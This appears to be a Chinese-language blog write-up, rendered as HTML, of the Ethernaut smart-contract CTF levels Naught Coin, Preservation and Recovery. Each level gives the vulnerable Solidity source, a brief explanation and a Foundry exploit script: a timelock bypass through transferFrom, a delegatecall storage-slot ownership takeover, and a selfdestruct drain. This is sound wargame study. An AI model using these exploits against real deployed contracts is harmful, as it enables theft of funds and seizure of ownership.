@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12,"avatar":{"url":"/images/avatar.png","rounded":true,"rotated":false}},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac","show_result":true},"fold":{"enable":false,"height":500},"language":false,"border_radius":{"header":true,"content":true}},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Naught Coin1234567891011121314151617181920212223242526272829303132contract NaughtCoin is ERC20 &#123;    &#x2F;&#x2F; string public constant name &#x3D; &#x27;NaughtCoin&#x27;;    &#x2F;&#x2F; string public constant symbol &#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ethernaut 16-20">
+<meta property="og:url" content="http://example.com/2026/02/02/ethernaut3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Naught Coin1234567891011121314151617181920212223242526272829303132contract NaughtCoin is ERC20 &#123;    &#x2F;&#x2F; string public constant name &#x3D; &#x27;NaughtCoin&#x27;;    &#x2F;&#x2F; string public constant symbol &#x3D;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202512201713185.png">
+<meta property="article:published_time" content="2026-02-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-02-01T19:23:32.720Z">
+<meta property="article:author" content="D3">
+<meta property="article:tag" content="Ethernaut">
+<meta property="article:tag" content="Web3 Security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202512201713185.png">
+
+
+<link rel="canonical" href="http://example.com/2026/02/02/ethernaut3/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2026/02/02/ethernaut3/","path":"2026/02/02/ethernaut3/","title":"Ethernaut 16-20"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Ethernaut 16-20 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hexo</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">2</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">1</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">3</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Naught-Coin"><span class="nav-number">1.</span> <span class="nav-text">Naught Coin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp"><span class="nav-number">1.2.</span> <span class="nav-text">Exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Preservation"><span class="nav-number">2.</span> <span class="nav-text">Preservation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-number">2.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp-1"><span class="nav-number">2.2.</span> <span class="nav-text">Exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Recovery"><span class="nav-number">3.</span> <span class="nav-text">Recovery</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="nav-number">3.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp-2"><span class="nav-number">3.2.</span> <span class="nav-text">Exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Alien-Codex"><span class="nav-number">4.</span> <span class="nav-text">Alien Codex</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-3"><span class="nav-number">4.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp-3"><span class="nav-number">4.2.</span> <span class="nav-text">Exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Denial"><span class="nav-number">5.</span> <span class="nav-text">Denial</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-4"><span class="nav-number">5.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp-4"><span class="nav-number">5.2.</span> <span class="nav-text">Exp</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">D3</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/d3mxbu7" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;d3mxbu7" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:e3m0bu7@gmail.com" title="E-Mail → mailto:e3m0bu7@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/02/ethernaut3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="D3">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Ethernaut 16-20 | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Ethernaut 16-20
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-02-02 00:00:00" itemprop="dateCreated datePublished" datetime="2026-02-02T00:00:00+08:00">2026-02-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF-Ethernaut-Writeups/" itemprop="url" rel="index"><span itemprop="name">CTF-Ethernaut Writeups</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a><strong>Naught Coin</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">contract NaughtCoin is ERC20 &#123;</span><br><span class="line">    // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">    // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">    // uint public constant decimals = 18;</span><br><span class="line">    uint256 public timeLock = block.timestamp + 10 * 365 days;</span><br><span class="line">    uint256 public INITIAL_SUPPLY;</span><br><span class="line">    address public player;</span><br><span class="line"></span><br><span class="line">    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));</span><br><span class="line">        // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">        // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">        _mint(player, INITIAL_SUPPLY);</span><br><span class="line">        emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;</span><br><span class="line">        super.transfer(_to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">    modifier lockTokens() &#123;</span><br><span class="line">        if (msg.sender == player) &#123;</span><br><span class="line">            require(block.timestamp &gt; timeLock);</span><br><span class="line">            _;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>在ERC20标准中存在两个转钱的方法，分别是<code>transfer</code>和<code>transferFrom</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">      address spender = _msgSender();</span><br><span class="line">      _spendAllowance(from, spender, amount);</span><br><span class="line">      _transfer(from, to, amount);</span><br><span class="line">      return true;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在是使用<code>transferFrom</code>要先使用<code>approve</code>方法，简单来说就是代币拥有者允许某个地址的交易代币的数量。	</p>
+<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract NaughtCoinSolution is Script &#123;</span><br><span class="line">    NaughtCoin naughtCoin = NaughtCoin(0xC0Faf18D2b14706353A4a62D752b1Ca4bbe63b5c);</span><br><span class="line"></span><br><span class="line">    function run() public &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        NaughtCoinAttack attack = new NaughtCoinAttack(address(naughtCoin));</span><br><span class="line">        ERC20(address(naughtCoin)).approve(address(attack), 1000000 * 1e18);</span><br><span class="line">        attack.attack();</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract NaughtCoinAttack &#123;</span><br><span class="line">    address public constant PLAYER = 0x1fec23bf3a1424726dD60b998B9BCf6b3B42b800;</span><br><span class="line">    NaughtCoin naughtCoin;</span><br><span class="line"></span><br><span class="line">    constructor(address _naughtCoin) &#123;</span><br><span class="line">        naughtCoin = NaughtCoin(_naughtCoin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        naughtCoin.transferFrom(PLAYER, address(this), 1000000 * 1e18);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line">    // public library contracts</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 storedTime;</span><br><span class="line">    // Sets the function signature for delegatecall</span><br><span class="line">    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;</span><br><span class="line">        timeZone1Library = _timeZone1LibraryAddress;</span><br><span class="line">        timeZone2Library = _timeZone2LibraryAddress;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // set the time for timezone 1</span><br><span class="line">    function setFirstTime(uint256 _timeStamp) public &#123;</span><br><span class="line">        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // set the time for timezone 2</span><br><span class="line">    function setSecondTime(uint256 _timeStamp) public &#123;</span><br><span class="line">        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line">    // stores a timestamp</span><br><span class="line">    uint256 storedTime;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 _time) public &#123;</span><br><span class="line">        storedTime = _time;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>利用<code>delegatecall</code>合约的存储特性,第一步先改变<code>slot</code>中<code>timeZone1Library</code>的值为攻击合约地址.利用攻击合约的函数<code>setTime(uint256)</code>改变代理合约<code> Preservation</code>的存储变量内容.</p>
+<h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">contract PreservationSolution is Script &#123;</span><br><span class="line">    Preservation preservation = Preservation(0x215061e387E1FF312cD943967d7c9f74FE9186F8);</span><br><span class="line"></span><br><span class="line">    function run() public &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        PreservationAttack attack = new PreservationAttack(address(preservation));</span><br><span class="line">        attack.attack();</span><br><span class="line">        bytes32 leet0 = vm.load(address(preservation), bytes32(uint256(0)));</span><br><span class="line">        bytes32 leet1 = vm.load(address(preservation), bytes32(uint256(1)));</span><br><span class="line">        bytes32 leet2 = vm.load(address(preservation), bytes32(uint256(2)));</span><br><span class="line">        console.logBytes32(leet0);</span><br><span class="line">        console.logBytes32(leet1);</span><br><span class="line">        console.logBytes32(leet2);</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PreservationAttack &#123;</span><br><span class="line">    address public addressOne;</span><br><span class="line">    address public addressTwo;</span><br><span class="line">    address public owner;</span><br><span class="line">    Preservation preservation;</span><br><span class="line"></span><br><span class="line">    constructor(address _preservationAddress) &#123;</span><br><span class="line">        preservation = Preservation(_preservationAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        //第一步改变timeZone1Library为攻击合约地址</span><br><span class="line">        preservation.setFirstTime(uint256(uint160(address(this))));</span><br><span class="line">        //第二步更改OWNER为自己的合约地址</span><br><span class="line">        preservation.setFirstTime(uint256(uint160(address(msg.sender))));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 _time) public &#123;</span><br><span class="line">        owner = address(uint160(_time));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line">    //generate tokens</span><br><span class="line">    function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">        new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line">    string public name;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // constructor</span><br><span class="line">    constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;</span><br><span class="line">        name = _name;</span><br><span class="line">        balances[_creator] = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // collect ether in return for tokens</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        balances[msg.sender] = msg.value * 10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow transfers of tokens</span><br><span class="line">    function transfer(address _to, uint256 _amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">        balances[msg.sender] = balances[msg.sender] - _amount;</span><br><span class="line">        balances[_to] = _amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // clean up after ourselves</span><br><span class="line">    function destroy(address payable _to) public &#123;</span><br><span class="line">        selfdestruct(_to);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>工厂合约创新的代币合约的时候没有记录代币合约地址，我们需要找到地址并且销毁代币合约转走余额，可以直接在Etherscan寻找，找自己钱包地址交易过的地址就行。</p>
+<p>还有一种从合约地址创建的规律推出来，具体可以看<a target="_blank" rel="noopener" href="https://medium.com/@tanner.dev/ethernaut-x-foundry-level-17-recovery-%E7%AD%94%E6%A1%88%E8%A7%A3%E8%AA%AA-5fea6b894e3a">文章</a>涉及RLP编码</p>
+<h3 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">interface IRecovery &#123;</span><br><span class="line">    function destroy(address payable _to) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract RecoverySolution is Script &#123;</span><br><span class="line">    function run() public &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        SimpleTokenAttacker attacker = new SimpleTokenAttacker(0x43be930C1C0935f82e4febd2DCf35768d8B6BE03);</span><br><span class="line">        attacker.attack();</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleTokenAttacker &#123;</span><br><span class="line">    address recoveryAddress;</span><br><span class="line"></span><br><span class="line">    constructor(address _address) &#123;</span><br><span class="line">        recoveryAddress = _address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        IRecovery(recoveryAddress).destroy(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
